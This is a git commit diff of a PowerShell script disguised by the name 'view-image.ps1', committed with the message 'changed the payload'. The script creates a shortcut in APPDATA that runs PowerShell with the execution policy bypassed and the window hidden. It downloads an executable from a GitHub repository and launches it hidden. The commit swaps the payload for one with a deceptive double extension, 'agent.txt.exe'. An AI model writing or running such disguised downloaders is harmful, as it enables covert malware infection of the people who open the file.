4e72a69fefbb50bb9b042aeac01d80a2f5904f83
MohamedAbderraouf <77074550+MohamedAbderraouf@users.noreply.github.com>
2025-03-17 11:27:58 +0100

    Update view-image.ps1
    changed the payload

--- view-image.ps1
+++ view-image.ps1
@@ -1,6 +1,6 @@
 $WshShell = New-Object -ComObject WScript.Shell                                               
 $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\installer.lnk")                    
 $Shortcut.TargetPath = "powershell.exe"                                                                              
-$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& { Invoke-WebRequest -Uri 'https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/msxsl.exe' -OutFile '%APPDATA%\msxsl.exe'; Start-Process -FilePath '%APPDATA%\msxsl.exe' -WindowStyle Hidden }`""                                                                    
+$Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"& { Invoke-WebRequest -Uri 'https://github.com/MohamedAbderraouf/hostingmsxsl/raw/refs/heads/main/agent.txt.exe' -OutFile '%APPDATA%\agent.txt.exe'; Start-Process -FilePath '%APPDATA%\agent.txt.exe' -WindowStyle Hidden }`""                                                                    
 $Shortcut.WorkingDirectory = "$env:APPDATA"                                                                         
 $Shortcut.Save()       
